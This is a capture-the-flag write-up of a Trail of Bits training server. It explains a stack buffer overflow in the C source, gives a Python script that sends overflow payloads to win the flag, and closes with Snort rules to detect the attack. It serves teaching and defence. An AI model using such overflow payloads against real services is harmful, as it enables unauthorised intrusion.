## TrailOfBits easy server

* [Program Logic](easy_server.md#program_logic)
* [Exploitation](easy_server.md#exploitation)
* [Scripting a Solution](easy_server.md#scripting_a_solution)
* [Stopping the Attack](easy_server.md#stopping_the_attack)

[Original Source](https://github.com/trailofbits/ctf/tree/master/exploits/binary1_workshop/easy)

This is a network based binary challenge from the Trail of Bits CTF training material. Both C source code and compiled binaries are available. Our goal is to complete three buffer overflow challenges without crashing the program to reap the flag.

### Program Logic

Initially start the program and allow it to bind to `0.0.0.0:12346` and loop waiting for client connections to play a game session.

```C
#define PORTNO 12346
int main(int argc, char *argv[]) {
	...
	// setup socket information and bind to interface
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = inet_addr("0.0.0.0");
  serv_addr.sin_port = htons(PORTNO);
  if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0)
    exit(1);
  listen(sockfd,5);
	...
	// wait for each client connection
  while (1) {
    newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
		...
		// accept connection and play game
    if (pid == 0)  {
      close(sockfd);
      readInput(newsockfd); // play the game!
      return;
    }
  } // end of while
  close(sockfd);
  return 0;
}
```

Once a connection is established we enter `readInput()` which provides the player with three choices of games to play. In other ctf challenges we might assume only one of these must be completed, as this is an easier challenge, this requires all three choices.

```C
void readInput(int sock) {
  // ...
  // prompt sent to user
  char* prompt="Do you want to be a?\n"
               "1.) Pokemon Master\n"
               "2.) Elite Hacker\n"
               "3.) The Batman\n";

  while(checksec(fptr)){
    fprintf(fptr, "%s" ,prompt); // send prompt
    fgets(choice, 4, fptr);      // receive choice
    switch(choice[0]) {          // check user choice
    case '1':
      pokemans(fptr);
      break;
    case '2':
      hekers(fptr);
      break;
    case '3':
      batmenss(fptr);
      break;
    default:
      fprintf(fptr, "\nThat is not one of the choices\n");
    }
  }
```

Once a choice is made, we enter that challenge choice, we are provided with the same basic layout for each option. We are asked a question and prompted for a response. The response we have is checked for a particular string but that is not important for game logic. Just after our string is checked, a value higher on the stack is checked for being a specific value that was otherwise never set... How could that happen?

```C
void pokemans(FILE* f){
  volatile int pikachy;
  char buf[32];

  fprintf(f,"So you want to be the best there ever was?\n");
  fgets(buf,40,f);
  switch(strcmp("catchemall\n",buf)){
  case 0:
    fprintf(f,"First you must get respect\n\n");
    break;
  default:
    fprintf(f,"Well then go away\n");
    break;
  }

  if(pikachy==0xfa75beef){
	// if(batsignet==0x12345678){
	// if(zeroWeekend==0xcafebabe){
    printf("set b\n");
    p=1;
 } else
   printf("pokemans: %4x\n", pikachy);
  return;
}
```

Before we get into how this function could be exploited to return us the flag, let's look into the final function that actually sends us the flag. This little guy is just looking for three global variables to be set, one for each correctly completed challenge. Otherwise it allows the `readInput()` function to continue allowing the player through each challenge.

```C
int checksec(FILE* f){
  FILE* key;
  char buf[1024];

  if(h&b&p){ // if they've all been set, print the key.
    key=fopen("easy_key","r");
    fread(buf,1024,1,key);
    fprintf(f,"%s",buf);
    fclose(key);
    return 0;
  }
  return 1;
}
```

### Exploitation

Restarting the application easily:
```
while [ $(netstat -naop | grep -c 12346) -eq 1 ]; do
  sleep 5
done
echo "starting easy32"
./easy32
```
`while [ $(netstat -naop | grep -c 12346) -eq 1 ]; do sleep 5; done; echo "starting easy32"; ./easy32`

Now that we have a complete understanding of what the binary expects, how do we procede to exploit it? The first step is returning to each challenge function and inspecting them to determine what vulnerabilities exist. Let's take same `pokemens()` function and reduce its functionality a bit.

```C
void pokemans(FILE* f){
  volatile int pikachy;
  char buf[32];
  ...
  fgets(buf,40,f);
	...
  if(pikachy==0xfa75beef)
    p=1;
	...
}
```

Removing the unnecessary printing and string checking, makes the vulnerability much more apparent. The function initializes two variables onto it's local stack. The first variable is the integer `pikachy` which is `4 bytes` in size, second is a 32 element buffer named `buf` of characters for storing the users response. Following initialization, the challenge requests `40 bytes` of data from the user and stores into `buf`. Once we retrieve data, `pikachy` is checked for the value `0xfa75beef` and if correct the `global variable p` is set.

Since the program itself never sets `pikachy` we know the expectation is that we will set it. But how? Remember how `fgets()` was accepting `40 bytes` into the `32 byte buf` variable? Due to the way a program handles memory, we can use the `fget()` command to overflow from `buf` and set `pikachy` to the value needed. The idea here is that because `pikachy` is created before `buf`, it is placed higher on the stack and can be written into. This theory is extended for the most basic of stack overflows causing remote code execution as well, however in a slightly more complex manor.


| Stack Layout 4 bytes wide | Value |
|----------|---------|
| .. higher addresses .. | ... |
| Saved EIP | ... |
| Saved EBP | ... |
| .. space for function local variables .. | |
| pikachy | uninitialized data |
| buf[1c-1f] | [00 00 00 00] |
| buf[18-1b] | [00 00 00 00] |
| buf[14-17] | [00 00 00 00] |
| buf[10-13] | [00 00 00 00] |
| buf[c-f] | [00 00 00 00] |
| buf[8-b] | [00 00 00 00] |
| buf[4-7] | [00 00 00 00] |
| buf[0-3] | [00 00 00 00] |
| .. lower addresses .. | ... |

The key aspects to understand here are that the stack grows down when adding new values, but writes up as it assigns data to those values. This allows us to leverage later created values and overwrite earlier ones if program logic allows. In this particular case, `fgets()` begins writing at `buf[0]` and writes up the stack towards `pikachy`. If we sent less than or equal to 32 bytes, `pikachy` would remain unchanged and our stack might look like:

| Stack Layout 4 bytes wide | Value |
|----------|---------|
| .. higher addresses .. | ... |
| Saved EIP | ... |
| Saved EBP | ... |
| .. space for function local variables .. | |
| pikachy | random data |
| buf[1c-1f] | [5d 5f 60 61] |
| buf[18-1b] | [59 5a 5b 5c] |
| buf[14-17] | [55 56 57 58] |
| buf[10-13] | [51 52 53 54] |
| buf[c-f] | [4d 4e 4f 50] |
| buf[8-b] | [49 4a 4b 4c] |
| buf[4-7] | [45 46 47 48] |
| buf[0-3] | [41 42 43 44] |
| .. lower addresses .. | ... |

While this would be desired for normal program operation, it does not satisfy our needs. Since we can, lets send a full 40 bytes and see what happens!!

| Stack Layout 4 bytes wide | Value |
|----------|---------|
| .. higher addresses .. | ... |
| Saved EIP | ... |
| Saved EBP | [66 67 68 69] |
| .. space for function local variables .. | |
| pikachy | [62 63 64 65] |
| buf[1c-1f] | [5d 5f 60 61] |
| buf[18-1b] | [59 5a 5b 5c] |
| buf[14-17] | [55 56 57 58] |
| buf[10-13] | [51 52 53 54] |
| buf[c-f] | [4d 4e 4f 50] |
| buf[8-b] | [49 4a 4b 4c] |
| buf[4-7] | [45 46 47 48] |
| buf[0-3] | [41 42 43 44] |
| .. lower addresses .. | ... |

This looks mostly OK right? Not so much, while not readily apparent, overwriting the saved EBP will force a crash of the application as it cannot return to the previous function and locate that functions stack frame. Instead we must understand the size of both `buf` and `pikachy` to ensure we only overwrite the minimum data needed. This can be achieved by sending 36 bytes of data you want, followed by a newline(\n) to stop `fgets()` from reading any more data. If sent correctly, our stack would look like:

| Stack Layout 4 bytes wide | Value |
|----------|---------|
| .. higher addresses .. | ... |
| Saved EIP | ... |
| Saved EBP | ... |
| .. space for function local variables .. | |
| pikachy | [ ef be 75 fa] |
| buf[1c-1f] | [5d 5f 60 61] |
| buf[18-1b] | [59 5a 5b 5c] |
| buf[14-17] | [55 56 57 58] |
| buf[10-13] | [51 52 53 54] |
| buf[c-f] | [4d 4e 4f 50] |
| buf[8-b] | [49 4a 4b 4c] |
| buf[4-7] | [45 46 47 48] |
| buf[0-3] | [41 42 43 44] |
| .. lower addresses .. | ... |

This is exactly what the program is looking for! `pikachy` sure looks a little strange though! Why is it reversed? Thats a detail of the system your program is running on called endianess. While out of scope for todays discussion, understand and expect the application to handle this change for you.

### Scripting a Solution

So how do we go about winning? Let's script out a solution in python! This will play through all three aspects of the challenge, sending the proper amount of data to fill buf and overflow the integer above it with the value we need to also cause the global value to be set later on.

```python
#!env python3
import socket
host="127.0.0.1"
port=12346
# a tuple of challenge selection and corresponding message
tups = [
    ("1\n", b"a"*32+b"\xef\xbe\x75\xfa\n"),
    ("2\n", b"b"*32+b"\xbe\xba\xfe\xca\n"),
    ("3\n", b"c"*32+b"\x78\x56\x34\x12\n")
]
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((host,port))			# connect to remote server
    data = sock.recv(72)				# retrieve initial message with options
    for opt,msg in tups: 				# for each of our challenge/message tuples
        print("Choosing: {}".format(opt[0]))
        sock.send(opt.encode())			# send our selected challenge option
        data = sock.recv(1024)			# retrieve challenge text
        print("Message: {}".format(msg))
        sock.send(msg)					# send exploitation message
        data = sock.recv(1024)			# recieve return of main challenge text
        data = data.decode()			# convert bytes to a string for checking
        if "flag{" in data:				# on final response, we have the key and main body text.
            data = data.split("\n")[1]	# split on newline, just after key
            print(data) 				# print our flag! We win!!
```

```
Choosing: 1
Message: b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\xbeu\xfa\n'
Choosing: 2
Message: b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\xbe\xba\xfe\xca\n'
Choosing: 3
Message: b'ccccccccccccccccccccccccccccccccxV4\x12\n'
flag{THIS_IS_THE_KEY}
```

### Stopping the Attack

Since this is an entirely network based attack, Snort and FirePower devices are in a perfect position to block this sort of attack, or alert on an indicator showing the service was remotely exploited. Let's look at a few possible versions and discuss the good and bad of each.

```
alert tcp $EXTERNAL_NET any -> $HOME_NET 12346 ( \
	msg:"Challenge 1 exploitation attempt"; \
	flow:to_server,established; \
		content:"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa|ef be 75 fa|"; \
	classtype:attempted-user; \
	sid:100000; \
);
alert tcp $EXTERNAL_NET any -> $HOME_NET 12346 ( \
	msg:"Challenge 2 exploitation attempt"; \
	flow:to_server,established; \
		content:"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb|be ba fe ca|"; \
	classtype:attempted-user; \
	sid:100001; \
);
alert tcp $EXTERNAL_NET any -> $HOME_NET 12346 ( \
	msg:"Challenge 3 exploitation attempt"; \
	flow:to_server,established; \
		content:"cccccccccccccccccccccccccccccccc|78 56 34 12|"; \
	classtype:attempted-user; \
	sid:100002; \
);
alert tcp $EXTERNAL_NET 12346 -> $HOME_NET any ( \
	msg:"Challenge flag exfiltration attempt"; \
	flow:to_client,established; \
		content:"flag{THIS_IS_THE_KEY}"; \
	classtype:misc-activity; \
	sid:100003; \
);
```

These rules will catch our traffic but cause a few issues, namely they are heavily false positive prone. Meaning we have a very high chance of an attack altering thier payload and successfully exploiting the server. What can we do to increase our chances of detecting an attack?

```
alert tcp $EXTERNAL_NET any -> $HOME_NET 12346 ( \
	msg:"Challenge 1 exploitation attempt"; \
	flow:to_server,established; \
		isdataat:32; \
		content:"|ef be 75 fa|"; \
	classtype:attempted-user; \
	sid:100000; \
);
alert tcp $EXTERNAL_NET any -> $HOME_NET 12346 ( \
	msg:"Challenge 2 exploitation attempt"; \
	flow:to_server,established; \
		isdataat:32; \
		content:"|be ba fe ca|"; \
	classtype:attempted-user; \
	sid:100001; \
);
alert tcp $EXTERNAL_NET any -> $HOME_NET 12346 ( \
	msg:"Challenge 3 exploitation attempt"; \
	flow:to_server,established; \
		isdataat:32; \
		content:"|78 56 34 12|"; \
	classtype:attempted-user; \
	sid:100002; \
);
alert tcp $EXTERNAL_NET 12346 -> $HOME_NET any ( \
	msg:"Challenge flag exfiltration attempt"; \
	flow:to_client,established; \
		content:"flag{"; \
	classtype:misc-activity; \
	sid:100003; \
);
```

These are looking much better! Removing the forced characters and instead leveraging isdataat, allows us to accept any possible value instead. However a careful eye may still notice an issue or two....

```
alert tcp $EXTERNAL_NET any -> $HOME_NET 12346 ( \
	msg:"Challenge exploitation attempt"; \
	flow:to_server,established; \
		isdataat:33; \
	classtype:attempted-user; \
	sid:100000; \
);
alert tcp $EXTERNAL_NET 12346 -> $HOME_NET any ( \
	msg:"Challenge flag exfiltration attempt"; \
	flow:to_client,established; \
		content:"flag{"; \
	classtype:misc-activity; \
	sid:100003; \
);
```

Well isn't that nice, we can move all of those exploitation rules into a single one. How does that work, they were all different payloads and mandatory following characters, right! Yes, but because they all hold the same message format and internal program logic, we can safely say any message to this server over 33 bytes is an attempt at exploitation!
